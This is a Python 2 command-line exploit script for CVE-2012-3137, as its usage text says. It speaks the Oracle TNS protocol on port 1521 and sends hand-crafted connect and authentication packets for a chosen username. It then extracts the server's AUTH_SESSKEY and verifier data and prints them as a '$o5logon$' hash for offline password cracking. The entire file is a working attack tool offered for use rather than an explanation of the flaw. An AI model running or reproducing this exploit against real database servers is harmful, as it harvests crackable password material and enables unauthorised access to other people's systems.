#!/usr/bin/python

import socket
#from optparse import OptionParser
from struct import pack, unpack
import getopt
from sys import argv

def prepare(string):
	return pack('B',len(string))+'\x00\x00\x00'+pack('B',len(string))+bytes(string)

def connect(user, service, host, debug):
	s=socket.socket()
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	port = 1521                 # Reserve a port
	try:
		s.connect((host, port))        # Bind to the port
	except:
		print "Connection error"
		exit()
	if debug: print ("Connecting to "+host+":"+str(port))

	header = dict([
		("Plength", ""),
		("PChecksum", "\x00\x00"),
		("PType", "\x01"),
		("Reserved", "\x00"),
		("HChecksum", "\x00\x00")])
	Pconnect = dict([
		("version", "\x01\x39"),
		("compat", "\x01\x2c"),
		("options", "\x0c\x01"),
		("session", "\x08\x00"),
		("unitSize", "\x7f\xff"),
		("ntProto", "\x7f\x08"),
		("line", "\x00\x00"),
		("valueof1", "\x01\x00"),
		("lengthConnect", ""),
		("offsetConnect", "\x00\x3a"),
		("maxData", "\x00\x00\x02\x00"),
		("Flags0", "\x41"),
		("Flags1", "\x41"),
		("Trace0", "\x00\x00\x00\x00"),
		("Trace1", "\x00\x00\x00\x00"),
		("Traceunique", "\x00\x00\x00\x00\x00\x00\x00\x00"),
		("Pad", "\x00\x00\x00\x00\x00\x00\x00\x00"),
		("Data", "")])

	Pconnect["Data"]="(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME="+service+")(CID=(PROGRAM=sqlplus@bzh)(HOST=bzh)(USER=r1)))"
	Pconnect["Data"]+="(ADDRESS=(PROTOCOL=TCP)(HOST="+host+")(PORT="+str(port)+")))"
	pl = len(Pconnect["Data"])
	Pconnect["lengthConnect"]=pack(">H", pl)
	header["Plength"]=pack(">H", (pl+58))
	
	Packet=header["Plength"]+header["PChecksum"]+header["PType"]+header["Reserved"]+header["HChecksum"]#+header["Pad"]
	Packet+= Pconnect["version"]+ Pconnect["compat"]+ Pconnect["options"]+ Pconnect["session"]+ Pconnect["unitSize"]
	Packet+=Pconnect["ntProto"]+ Pconnect["line"]+ Pconnect["valueof1"]+ Pconnect["lengthConnect"]+ Pconnect["offsetConnect"]
	Packet+= Pconnect["maxData"]+ Pconnect["Flags0"]+ Pconnect["Flags1"]+ Pconnect["Trace0"]+ Pconnect["Trace1"]
	Packet+=Pconnect["Traceunique"]+ Pconnect["Pad"]+Pconnect["Data"]
	PacketBytes = bytes(Packet) #, "ISO-8859-1")
	s.send(PacketBytes)

	while True:
		resp=s.recv(2000)
		if resp[4] == '\x0b':
			s.send(PacketBytes)
		elif resp[4] == '\x02':
			if debug: print "Accept"
			response="\xde\xad\xbe\xef\x00\x92\x0a\x20\x04\x00\x00\x04\x00\x00\x04\x00\x03\x00\x00\x00\x00\x00\x04\x00"
			response+="\x05\x0a\x20\x04\x00\x00\x08\x00\x01\x00\x00\x21\x0a\xa5\x00\xba\xdc\x00\x12\x00\x01\xde\xad\xbe"
			response+="\xef\x00\x03\x00\x00\x00\x04\x00\x04\x00\x01\x00\x01\x00\x02\x00\x01\x00\x03\x00\x00\x00\x00\x00"
			response+="\x04\x00\x05\x0a\x20\x04\x00\x00\x02\x00\x03\xe0\xe1\x00\x02\x00\x06\xfc\xff\x00\x02\x00\x02\x00"
			response+="\x00\x00\x00\x00\x04\x00\x05\x0a\x20\x04\x00\x00\x0c\x00\x01\x00\x11\x06\x10\x0c\x0f\x0a\x0b\x08"
			response+="\x02\x01\x03\x00\x03\x00\x02\x00\x00\x00\x00\x00\x04\x00\x05\x0a\x20\x04\x00\x00\x03\x00\x01\x00"
			response+="\x03\x01"
			packet="\x00\x9c\x00\x00\x06\x00\x00\x00\x00\x00"
			s.send(packet+response)
		elif resp[4] == '\x06':
			if debug: print "data"
			if resp[10:14] == '\xde\xad\xbe\xef':
				if debug: print "additional options"
				response="\x00\x26\x00\x00\x06\x00\x00\x00\x00\x00\x01\x06\x05\x04\x03\x02\x01\x00\x78\x38\x36\x5f\x36\x34"
				response+="\x2f\x4c\x69\x6e\x75\x78\x20\x32\x2e\x34\x2e\x78\x78\x00"
				s.send(response)
			if resp[10]=='\x01':
				if debug: print "protocol negotiation"
				response="\x00\x45\x00\x00\x06\x00\x00\x00\x00\x00\x02\xb2\x00\xb2\x00\x42\x21\x06\x01\x01\x01\x0d\x01\x01"
				response+="\x04\x01\x01\x01\x01\x01\x01\x01\xff\xff\x03\x08\x03\x03\x01\x00\x3f\x01\x07\x3f\x01\x02\x01\x01"
				response+="\x03\x01\x05\x02\x01\x00\x00\x18\x80\x00\x00\x00\x3c\x3c\x3c\x80\x00\x00\x00\xd0\x07"
				s.send(response)
			if resp[10]=='\x02':
				if debug: print "exchange data type representations"
				response="\x00\x00\x03\x76\x02\x40\x69\x04\x02\x00\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x50\x9e\x5b\x56\xff"
				response+="\x7f\x00\x00\x05\x00\x00\x00\x45\x71\x02\x70\xf0\x98\x5b\x56\xff\x7f\x00\x00\x2c\xa2\x5b\x56\xff"
				response+="\x7f\x00\x00"
				response+=pack('B',len(user))+bytes(user)
				response+=prepare('AUTH_TERMINAL')
				response+=prepare('pts/5')+'\x00\x00\x00\x00'
				response+=prepare('AUTH_PROGRAM_NM')
				response+=prepare('chall@bzh(TNS V1-V3)')+'\x00\x00\x00\x00'
				response+=prepare('AUTH_MACHINE')
				response+=prepare('bzh')+'\x00\x00\x00\x00'
				response+=prepare('AUTH_PID')
				response+=prepare('1337')+'\x00\x00\x00\x00'
				response+=prepare('AUTH_SID')
				response+=prepare('r1')+'\x00\x00\x00\x00'
				header= pack('>H',8+len(response))+'\x00\x00'+'\x06'+'\x00\x00\x00'
				s.send(header+response)
			if resp[10]=='\x03':
				if debug: print "TTI Function Call"
				exit()
			if resp[10]=='\x08':
				if debug: print 'Server to client response'
				sizestrAUTH_SESSKEY,=unpack('B',resp[13])
				if debug: print sizestrAUTH_SESSKEY
				strAUTH_SESSKEY=resp[18:18+(sizestrAUTH_SESSKEY)]
				if debug: print strAUTH_SESSKEY
				if debug: print bytes.decode(strAUTH_SESSKEY)
				sizeSESSKEY,=unpack('B',resp[18+sizestrAUTH_SESSKEY])
				if debug: print sizeSESSKEY
				offset = 18+sizestrAUTH_SESSKEY+5
				SESSKEY=resp[offset:offset+sizeSESSKEY]
				if debug: print SESSKEY
				offset = offset+sizeSESSKEY+4
				sizestrAUTH_VFR_DATA, =unpack('B',resp[offset])
				if debug: print sizestrAUTH_VFR_DATA
				offset=offset + 5
				strAUTH_VFR_DATA=resp[offset:offset+sizestrAUTH_VFR_DATA]
				if debug: print strAUTH_VFR_DATA
				offset = offset + sizestrAUTH_VFR_DATA + 4
				sizeVFR_DATA, = unpack('B',resp[offset])
				if debug: print sizeVFR_DATA
				VFR_DATA=resp[offset+1:offset+1+sizeVFR_DATA]
				if debug: print VFR_DATA
				print user+':$o5logon$'+SESSKEY+'*'+VFR_DATA
				s.close()
				exit()
		elif resp[4]=='\x04':
			print "error : bad service name"
			s.close()
			exit()
		else:
			print "error"
			s.close()
			exit()

def usage():
	print "Usage: "+argv[0]+" -u user -s service_name -i host [options] "
	print "CVE-2012-3137 Oracle exploit"
	print ""
	print "-u, --user			username to test"
	print "-s, --service			oracle service name"
	print "-i, --host			server host or ip address"
	print "-d, --debug			print debug message"

if __name__ == '__main__':
	try:
		opts, args = getopt.getopt(argv[1:], "hu:s:i:d", ["help", "user=", "service=", "host=", "debug"])
	except getopt.GetoptError as err:
		print(err)
		usage()
		exit()
	debug = False
	user=None
	service=None
	host=None
	for option, value in opts:
		if option == "-v":
			debug = True
		elif option in ("-h", "--help"):
			usage()
			exit()
		elif option in ("-u", "--user"):
			user = value
		elif option in ("-s", "--service"):
			service = value
		elif option in ("-i", "--host"):
			host = value
		elif option in ("-d", "--debug"):
			debug=True
		else:
			print("Unknown option {}".format(option))
			exit()
	if user==None or service==None or host==None:
		usage()
		exit()
	connect(user, service, host, debug)
